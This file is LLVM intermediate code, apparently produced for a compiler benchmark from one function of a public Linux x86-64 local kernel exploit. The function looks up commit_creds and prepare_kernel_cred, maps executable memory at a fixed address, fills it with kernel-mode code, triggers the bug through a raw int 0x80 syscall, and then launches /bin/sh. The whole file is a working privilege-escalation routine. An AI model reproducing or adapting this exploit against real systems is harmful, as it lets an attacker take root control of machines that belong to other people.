; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux_x86-64/local/extr_15023.c_docall.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux_x86-64/local/extr_15023.c_docall.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [13 x i8] c"commit_creds\00", align 1
@commit_creds = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [39 x i8] c"symbol table not available, aborting!\0A\00", align 1
@.str.2 = private unnamed_addr constant [20 x i8] c"prepare_kernel_cred\00", align 1
@prepare_kernel_cred = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [16 x i8] c"mapping at %lx\0A\00", align 1
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@PROT_EXEC = common dso_local global i32 0, align 4
@MAP_PRIVATE = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@MAP_ANONYMOUS = common dso_local global i32 0, align 4
@MAP_FAILED = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [12 x i8] c"mmap fault\0A\00", align 1
@kernelmodecode = common dso_local global i64 0, align 8
@.str.5 = private unnamed_addr constant [33 x i8] c"UID %d, EUID:%d GID:%d, EGID:%d\0A\00", align 1
@.str.6 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.7 = private unnamed_addr constant [7 x i8] c"bin/sh\00", align 1
@.str.8 = private unnamed_addr constant [15 x i8] c"no /bin/sh ??\0A\00", align 1
@llvm.used = appending global [1 x i8*] [i8* bitcast (void (i32*, i32)* @docall to i8*)], section "llvm.metadata"

; Function Attrs: noinline nounwind optnone uwtable
define internal void @docall(i32* %0, i32 %1) #0 {
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32* %0, i32** %3, align 8
  store i32 %1, i32* %4, align 4
  %6 = call i64 @get_symbol(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0))
  store i64 %6, i64* @commit_creds, align 8
  %7 = load i64, i64* @commit_creds, align 8
  %8 = icmp ne i64 %7, 0
  br i1 %8, label %12, label %9

9:                                                ; preds = %2
  %10 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.1, i64 0, i64 0))
  %11 = call i32 @exit(i32 1) #3
  unreachable

12:                                               ; preds = %2
  %13 = call i64 @get_symbol(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.2, i64 0, i64 0))
  store i64 %13, i64* @prepare_kernel_cred, align 8
  %14 = load i64, i64* @prepare_kernel_cred, align 8
  %15 = icmp ne i64 %14, 0
  br i1 %15, label %19, label %16

16:                                               ; preds = %12
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.1, i64 0, i64 0))
  %18 = call i32 @exit(i32 1) #3
  unreachable

19:                                               ; preds = %12
  %20 = load i32*, i32** %3, align 8
  %21 = ptrtoint i32* %20 to i32
  %22 = and i32 %21, -4096
  store i32 %22, i32* %5, align 4
  %23 = load i32, i32* %5, align 4
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0), i32 %23)
  %25 = load i32, i32* %5, align 4
  %26 = sext i32 %25 to i64
  %27 = inttoptr i64 %26 to i8*
  %28 = load i32, i32* %4, align 4
  %29 = load i32, i32* @PROT_READ, align 4
  %30 = load i32, i32* @PROT_WRITE, align 4
  %31 = or i32 %29, %30
  %32 = load i32, i32* @PROT_EXEC, align 4
  %33 = or i32 %31, %32
  %34 = load i32, i32* @MAP_PRIVATE, align 4
  %35 = load i32, i32* @MAP_FIXED, align 4
  %36 = or i32 %34, %35
  %37 = load i32, i32* @MAP_ANONYMOUS, align 4
  %38 = or i32 %36, %37
  %39 = call i64 @mmap(i8* %27, i32 %28, i32 %33, i32 %38, i32 -1, i32 0)
  %40 = load i64, i64* @MAP_FAILED, align 8
  %41 = icmp eq i64 %39, %40
  br i1 %41, label %42, label %45

42:                                               ; preds = %19
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i64 0, i64 0))
  %44 = call i32 @exit(i32 1) #3
  unreachable

45:                                               ; preds = %19
  br label %46

46:                                               ; preds = %57, %45
  %47 = load i32*, i32** %3, align 8
  %48 = ptrtoint i32* %47 to i32
  %49 = load i32, i32* %5, align 4
  %50 = load i32, i32* %4, align 4
  %51 = add nsw i32 %49, %50
  %52 = icmp slt i32 %48, %51
  br i1 %52, label %53, label %60

53:                                               ; preds = %46
  %54 = load i64, i64* @kernelmodecode, align 8
  %55 = trunc i64 %54 to i32
  %56 = load i32*, i32** %3, align 8
  store i32 %55, i32* %56, align 4
  br label %57

57:                                               ; preds = %53
  %58 = load i32*, i32** %3, align 8
  %59 = getelementptr inbounds i32, i32* %58, i32 1
  store i32* %59, i32** %3, align 8
  br label %46

60:                                               ; preds = %46
  call void asm sideeffect "\0A\09movq $$0x101, %rax\0A\09int $$0x80\0A", "~{dirflag},~{fpsr},~{flags}"() #4, !srcloc !2
  %61 = call i32 (...) @getuid()
  %62 = call i32 (...) @geteuid()
  %63 = call i32 (...) @getgid()
  %64 = call i32 (...) @getegid()
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.5, i64 0, i64 0), i32 %61, i32 %62, i32 %63, i32 %64)
  %66 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i64 0, i64 0), i32* null)
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.8, i64 0, i64 0))
  %68 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i64 @get_symbol(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @mmap(i8*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @getuid(...) #1

declare dso_local i32 @geteuid(...) #1

declare dso_local i32 @getgid(...) #1

declare dso_local i32 @getegid(...) #1

declare dso_local i32 @execl(i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }
attributes #4 = { nounwind }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{i32 1530, i32 1544, i32 1576}
